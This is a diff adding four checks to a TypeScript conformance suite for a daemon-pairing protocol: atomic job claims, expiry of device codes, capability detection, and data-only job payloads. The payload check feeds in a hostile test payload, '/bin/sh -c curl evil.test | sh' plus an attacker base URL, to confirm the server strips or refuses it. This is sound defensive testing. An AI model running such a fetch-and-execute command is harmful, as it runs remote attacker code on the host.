@@ -1,5 +1,17 @@
-import { AUDIENCES, OFFER_SCOPES, type MustId } from "@byollm/protocol";
-import { advance, ownerIdFor, pairDaemon, sleep, waitFor } from "./harness.js";
+import {
+  AUDIENCES,
+  OFFER_SCOPES,
+  PROTOCOL_VERSION,
+  type MustId,
+} from "@byollm/protocol";
+import {
+  advance,
+  claimOne,
+  ownerIdFor,
+  pairDaemon,
+  sleep,
+  waitFor,
+} from "./harness.js";
 import type { ConformanceTarget } from "./target.js";
 
 /** One certification check. */
@@ -860,6 +872,236 @@ export const CHECKS: readonly Check[] = [
         });
       } finally {
         await bob.dispose();
+      }
+    },
+  },
+
+  {
+    id: "C019_CLAIM_ATOMIC",
+    title: "two runners racing one job — exactly one gets it",
+    musts: ["CLAIM_ATOMIC"],
+    async run(target: ConformanceTarget): Promise<void> {
+      // The check most likely to catch a real store bug. A Postgres adapter
+      // without `FOR UPDATE SKIP LOCKED`, or a memory store with an `await`
+      // between "read queued" and "write claimed", passes every other check
+      // in this kit and double-runs jobs the moment two daemons are online.
+      // The user sees one prompt answered twice and pays for it twice.
+      const a = await pairDaemon(target, { owner: "alice", label: "laptop" });
+      const b = await pairDaemon(target, { owner: "alice", label: "desktop" });
+      try {
+        const job = await target.enqueue({
+          kind: "llm.generate",
+          payload: prompt("only once, please"),
+          owner: "alice",
+          audience: "self",
+        });
+
+        // Concurrently, not in sequence — sequential ticks would pass against
+        // a store with no atomicity at all.
+        await Promise.all([a.runner.tick(), b.runner.tick()]);
+        await waitFor(async () => (await target.job(job.id))?.state === "ok", {
+          what: "the contested job to finish",
+        });
+
+        const ran = a.backend.seen.length + b.backend.seen.length;
+        assert(
+          ran === 1,
+          `the job ran ${String(ran)} times across two runners, not once`,
+        );
+      } finally {
+        await a.dispose();
+        await b.dispose();
+      }
+    },
+  },
+
+  {
+    id: "C020_PAIR_CODE_EXPIRES",
+    title: "an expired device code cannot be redeemed",
+    musts: ["PAIR_CODE_EXPIRES"],
+    async run(target: ConformanceTarget): Promise<void> {
+      // A device code is a bearer credential displayed on a screen. If it
+      // outlives its window, a code left visible in a terminal — or read over
+      // someone's shoulder hours later — still pairs a stranger's daemon to
+      // this user's account.
+      const started = await target.fetch(
+        new Request(`${target.origin}/byollm/pair`, {
+          method: "POST",
+          headers: { "content-type": "application/json" },
+          body: JSON.stringify({
+            protocolVersion: PROTOCOL_VERSION,
+            action: "start",
+            daemon: {
+              version: "conformance",
+              label: "expiring-daemon",
+              platform: "linux",
+            },
+            capabilities: [],
+          }),
+        }),
+      );
+      assert(started.status === 200, "pair start did not answer 200");
+      const pairing = (await started.json()) as {
+        deviceCode: string;
+        userCode: string;
+        expiresAt: number;
+      };
+
+      // Past the window the server itself declared.
+      await advance(target, pairing.expiresAt - Date.now() + 1_000);
+
+      // 1. Approval must not resurrect it. A server that pairs here has an
+      //    expiry that is decoration.
+      let approved = true;
+      try {
+        await target.approvePairing(pairing.userCode, "alice");
+      } catch {
+        approved = false;
+      }
+
+      // 2. And the daemon polling with the device code must be told, in the
+      //    protocol's own words, rather than left waiting.
+      const polled = await target.fetch(
+        new Request(`${target.origin}/byollm/pair`, {
+          method: "POST",
+          headers: { "content-type": "application/json" },
+          body: JSON.stringify({
+            protocolVersion: PROTOCOL_VERSION,
+            action: "poll",
+            deviceCode: pairing.deviceCode,
+          }),
+        }),
+      );
+      const status =
+        polled.status === 200
+          ? ((await polled.json()) as { status: string }).status
+          : "rejected";
+
+      assert(
+        !approved || status !== "approved",
+        "an expired device code still paired a runner",
+      );
+      assert(
+        status === "expired" || status === "denied" || status === "rejected",
+        `polling an expired code answered "${status}"`,
+      );
+    },
+  },
+
+  {
+    id: "C021_CAPABILITY_IS_DETECTED",
+    title: "a runner advertises only what is installed and healthy",
+    musts: ["CAPABILITY_IS_DETECTED"],
+    async run(target: ConformanceTarget): Promise<void> {
+      // Config is a wish; the matrix must be the intersection of the wish and
+      // reality. A daemon that advertises what its config names would have
+      // the server route work to a machine that cannot run it — and the app
+      // would wait for a result nobody is producing, which is exactly the
+      // failure `NO_RUNNER_SIGNAL` exists to prevent.
+      const daemon = await pairDaemon(target, { owner: "alice" });
+      try {
+        // Configured, but the model is not there.
+        daemon.backend.healthy = false;
+        const advertised = await daemon.runner.detectCapabilities();
+        assert(
+          advertised.length === 0,
+          `an unhealthy backend advertised ${String(advertised.length)} capabilities`,
+        );
+
+        // Healthy, but serving a different model than the config names.
+        daemon.backend.healthy = true;
+        daemon.backend.models = ["some-other-model"];
+        const wrongModel = await daemon.runner.detectCapabilities();
+        assert(
+          wrongModel.length === 0,
+          "a backend without the configured model still advertised it",
+        );
+
+        // Reality restored: the capability comes back.
+        daemon.backend.models = ["echo-model"];
+        const recovered = await daemon.runner.detectCapabilities();
+        assert(
+          recovered.length > 0,
+          "a healthy backend with the configured model advertised nothing",
+        );
+      } finally {
+        await daemon.dispose();
+      }
+    },
+  },
+
+  {
+    id: "C022_KIND_NO_CODE",
+    title: "a claimed job carries data only — no command, path, or routing",
+    // Deliberately not claiming NO_PAYLOAD_ROUTING as well. This proves the
+    // wire-shape half — the server cannot convey a `model` or `baseUrl` to a
+    // daemon — but the MUST is that no code path *routes* on payload content,
+    // and only the adversarial suite proves that, by spawning a real child
+    // and reading back an argv that is byte-identical under hostile input.
+    // Listing it here would put "verified by conformance" beside a claim this
+    // check does not establish.
+    musts: ["KIND_NO_CODE"],
+    async run(target: ConformanceTarget): Promise<void> {
+      // The wire shape is the first place this is enforced: there is no field
+      // to carry a command, so a hostile *app* cannot smuggle one to a
+      // daemon. That only holds if the server refuses to pass through keys
+      // the schema does not name — a store that round-trips arbitrary JSON
+      // would hand the daemon whatever the app wrote.
+      const daemon = await pairDaemon(target, { owner: "alice" });
+      const SMUGGLED = ["command", "argv", "model", "baseUrl"];
+      try {
+        // Two mechanisms satisfy this MUST and the kit must accept either:
+        // refuse the payload outright, or accept it and carry only the fields
+        // the kind defines. What it may not do is deliver the extras to a
+        // daemon. Asserting one mechanism would certify a house style rather
+        // than the property.
+        let refused = false;
+        try {
+          await target.enqueue({
+            kind: "llm.generate",
+            payload: {
+              prompt: "ordinary text",
+              command: "/bin/sh",
+              argv: ["-c", "curl evil.test | sh"],
+              model: "some-other-model",
+              baseUrl: "http://evil.test/v1",
+            } as never,
+            owner: "alice",
+            audience: "self",
+          });
+        } catch {
+          refused = true;
+        }
+
+        if (!refused) {
+          const claimed = await claimOne(target, daemon);
+          const payload = claimed.payload as Record<string, unknown>;
+          for (const smuggled of SMUGGLED) {
+            assert(
+              payload[smuggled] === undefined,
+              `the claim response carried a "${smuggled}" field`,
+            );
+          }
+          assert(
+            payload["prompt"] === "ordinary text",
+            "the legitimate payload field did not survive",
+          );
+        }
+
+        // Either way, an ordinary payload must still work — a server that
+        // refuses everything would otherwise pass this check trivially.
+        const ok = await target.enqueue({
+          kind: "llm.generate",
+          payload: prompt("ordinary text"),
+          owner: "alice",
+          audience: "self",
+        });
+        await daemon.runner.tick();
+        await waitFor(async () => (await target.job(ok.id))?.state === "ok", {
+          what: "a well-formed job to run",
+        });
+      } finally {
+        await daemon.dispose();
       }
     },
   },
